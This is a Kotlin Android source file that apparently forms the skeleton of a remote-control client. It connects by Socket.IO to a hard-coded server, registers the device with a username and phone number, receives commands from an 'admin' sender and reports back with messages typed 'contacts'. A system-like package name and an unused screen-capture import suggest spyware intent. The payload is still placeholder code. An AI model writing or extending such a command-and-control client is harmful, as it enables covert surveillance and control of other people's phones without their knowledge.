package android.systems.myapplication

import android.app.Activity
import android.content.Context
import android.media.projection.MediaProjectionManager
import android.os.Build
import androidx.annotation.RequiresApi
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject

class SocketConnectionSetup (private val context :Context) {


    lateinit var mSocket: Socket


    public fun runSocket(){
        mSocket = IO.socket("http://192.168.1.5:80")
        mSocket.connect()
        //socket
        try{

            mSocket.connect()
            mSocket.on("msg"){args->
                if(args[0]!=null){
                    var message = args[0] as JSONObject;
                  
                    //extracting command and sender address from the socket received (socket.on)
                    var data = message.get("command") as String;
                    var sender = message.get("sender") as String;
                  
                    //sample times & dates
                    var dateNow = "15/09/1999"
                    var timeNow = "12:15"

                    var username = context.getString(R.string.username)
                    var room = context.getString(R.string.room)
                    
                    //obj sample of data to send to Admin (Receiver)
                    var obj = "{\"type\":\"contacts\",\"secret\":\"secret\",\"admin\":\"$sender\",\"command\":\"the command (btw fucQ)i got was $data\"," +
                            "\"clientName\":\"$username\",\"date\":\"$dateNow\",\"time\":\"$timeNow\"}"
                    println("the command is $data")

                    mSocket.emit("toAdmin",obj)
                }
            }
            
            //collecting data from res/values/string.xml (username and room)
            var username = context.getString(R.string.username)
            var room = context.getString(R.string.room)
            
            //connection initialization String (JSON.stringify Mode)
            var cons = "{\"room\":\"$room\",\"username\":\"$username\",\"constr\":{\"os\":\"android\",\"phnum\":\"807564591\"}}"
            mSocket.emit("joinRoom",cons)
        }
        catch (e: Exception){
            print(e)
        }




    }
}
